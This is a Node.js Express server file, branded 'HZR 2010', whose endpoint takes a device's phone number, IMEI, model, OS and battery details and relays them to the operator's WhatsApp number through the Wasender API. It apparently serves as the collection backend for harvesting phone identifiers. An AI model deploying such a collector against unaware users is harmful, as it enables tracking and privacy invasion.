const express = require("express");
const cors = require("cors");
const path = require("path");
require("dotenv").config();

const app = express();

const PORT = process.env.PORT || 3000;

const WASENDER_TOKEN = process.env.WASENDER_TOKEN;
const MY_WHATSAPP_NUMBER = process.env.MY_WHATSAPP_NUMBER;


// ==========================================
// CHECK ENVIRONMENT VARIABLES
// ==========================================

if (!WASENDER_TOKEN || !MY_WHATSAPP_NUMBER) {

    console.error("=================================");
    console.error("ERROR: Missing environment variables");
    console.error("Please set:");
    console.error("WASENDER_TOKEN");
    console.error("MY_WHATSAPP_NUMBER");
    console.error("=================================");

    process.exit(1);
}


// ==========================================
// MIDDLEWARE
// ==========================================

app.use(cors());

app.use(
    express.json({
        limit: "20kb"
    })
);


// ==========================================
// HOME PAGE
// ==========================================

app.get("/", (req, res) => {

    res.sendFile(
        path.join(__dirname, "index.html")
    );

});


// ==========================================
// STATUS
// ==========================================

app.get("/api/status", (req, res) => {

    res.json({

        success: true,

        service: "HZR 2010",

        status: "online"

    });

});


// ==========================================
// SEND DEVICE INFORMATION
// ==========================================

app.post("/api/send-device-info", async (req, res) => {

    console.log("");
    console.log("=================================");
    console.log("HZR 2010");
    console.log("DEVICE INFO REQUEST RECEIVED");
    console.log("=================================");


    try {

        const info = req.body || {};


        // ==========================================
        // PHONE NUMBER
        // ==========================================

        const phoneNumber =
            info.phoneNumber || "Unavailable";


        // ==========================================
        // IMEI
        // ==========================================

        const imei =
            info.imei || "Unavailable";


        // ==========================================
        // DEVICE
        // ==========================================

        const manufacturer =
            info.manufacturer || "Unknown";

        const device =
            info.device || "Unknown";

        const android =
            info.android || "Unknown";

        const sdk =
            info.sdk || "Unknown";


        // ==========================================
        // HARDWARE
        // ==========================================

        const cpu =
            info.cpu || "Unknown";


        // ==========================================
        // BATTERY
        // ==========================================

        const battery =
            info.battery || "Unknown";


        // ==========================================
        // STORAGE
        // ==========================================

        const storage =
            info.storage || "Unknown";


        // ==========================================
        // SCREEN
        // ==========================================

        const screen =
            info.screen || "Unknown";


        // ==========================================
        // TIME
        // ==========================================

        const time =
            info.time || "Unknown";


        // ==========================================
        // WHATSAPP MESSAGE
        // ==========================================

        const message =

`🔵 HZR 2010
━━━━━━━━━━━━━━━━

📞 PHONE
Number       : ${phoneNumber}

🔐 DEVICE ID
IMEI         : ${imei}

📱 DEVICE
Manufacturer : ${manufacturer}
Model        : ${device}

🤖 ANDROID
Version      : ${android}
SDK          : ${sdk}

⚙️ HARDWARE
CPU Cores    : ${cpu}

📺 DISPLAY
Screen       : ${screen}

🔋 BATTERY
Status       : ${battery}

💾 STORAGE
Storage      : ${storage}

🕒 TIME
Local Time   : ${time}

━━━━━━━━━━━━━━━━
© 2010–2026 HZR 2010`;



        // ==========================================
        // SERVER LOG
        // ==========================================

        console.log("Phone:", phoneNumber);
        console.log("IMEI:", imei);
        console.log(
            "Device:",
            manufacturer,
            device
        );

        console.log(
            "Android:",
            android
        );

        console.log(
            "Sending information to WhatsApp..."
        );

        console.log(
            "Recipient:",
            MY_WHATSAPP_NUMBER
        );


        // ==========================================
        // SEND TO WASENDER
        // ==========================================

        const response = await fetch(
            "https://api.wasender.dev/messages/text",
            {

                method: "POST",

                headers: {

                    "Authorization":
                        `Bearer ${WASENDER_TOKEN}`,

                    "Content-Type":
                        "application/json"

                },

                body: JSON.stringify({

                    to: MY_WHATSAPP_NUMBER,

                    body: message

                })

            }
        );


        // ==========================================
        // READ RESPONSE
        // ==========================================

        const resultText =
            await response.text();


        console.log(
            "Wasender HTTP status:",
            response.status
        );

        console.log(
            "Wasender response:",
            resultText
        );


        // ==========================================
        // API ERROR
        // ==========================================

        if (!response.ok) {

            console.error(
                "Wasender API returned an error."
            );

            return res.status(502).json({

                success: false,

                error:
                    "WhatsApp API error"

            });

        }


        // ==========================================
        // PARSE RESPONSE
        // ==========================================

        let result = {};

        try {

            result =
                JSON.parse(resultText);

        }

        catch (e) {

            console.log(
                "Wasender response was not JSON."
            );

        }


        // ==========================================
        // SUCCESS
        // ==========================================

        console.log(
            "Message accepted by Wasender."
        );

        console.log(
            "================================="
        );


        res.json({

            success: true,

            message:
                "Information sent successfully",

            wasender:
                result

        });


    }

    catch (error) {

        console.error(
            "================================="
        );

        console.error(
            "HZR 2010 SERVER ERROR:"
        );

        console.error(error);

        console.error(
            "================================="
        );


        res.status(500).json({

            success: false,

            error:
                "Internal server error"

        });

    }

});


// ==========================================
// START SERVER
// ==========================================

app.listen(
    PORT,
    "0.0.0.0",
    () => {

        console.log("");
        console.log("=================================");
        console.log("HZR 2010 SERVER");
        console.log("=================================");

        console.log(
            `Server running on port ${PORT}`
        );

        console.log(
            "Service: Online"
        );

        console.log(
            "================================="
        );

    }
);
